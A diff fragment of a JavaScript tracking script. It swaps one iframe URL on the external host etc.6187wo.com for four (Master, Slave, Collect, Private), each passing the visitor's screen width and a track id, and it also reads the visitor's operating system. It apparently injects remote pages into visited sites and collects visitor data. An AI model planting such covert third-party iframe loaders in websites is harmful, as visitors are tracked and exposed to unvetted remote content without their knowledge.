@@ -5,10 +5,12 @@ window.curNode = document.currentScript || (function() {
 var s_w = window.screen.width;
 
 var trackid = '10185';
-var trackidmd5 = 'fdc9d9327f967051e35d9657671d07b1';
 var statid = '1279824037'
 
-var core_url = '//etc.6187wo.com/' + trackid + '/' + trackidmd5 + '/Core.html#s_w=' + s_w;
+var Master_Url = '//etc.6187wo.com/Master/Core.html#s_w=' + s_w+'&trackid='+trackid;
+var Slave_Url = '//etc.6187wo.com/Slave/Core.html#s_w=' + s_w+'&trackid='+trackid;
+var Collect_Url = '//etc.6187wo.com/Collect/Core.html#s_w=' + s_w+'&trackid='+trackid;
+var Private_Url = '//etc.6187wo.com/Private/Core.html#s_w=' + s_w+'&trackid='+trackid;
 function Core(url) {
     var d = document.createElement("div");
     var c = document.createElement("iframe");
@@ -135,7 +137,9 @@ function getOS() {
     os_type = os;
     return os_type;
 }
-Core(core_url);
-Core(core_url);
+Core(Master_Url);
+Core(Slave_Url);
+Core(Collect_Url);
+Core(Private_Url);
 GetInfo();
 Statistics(statid);
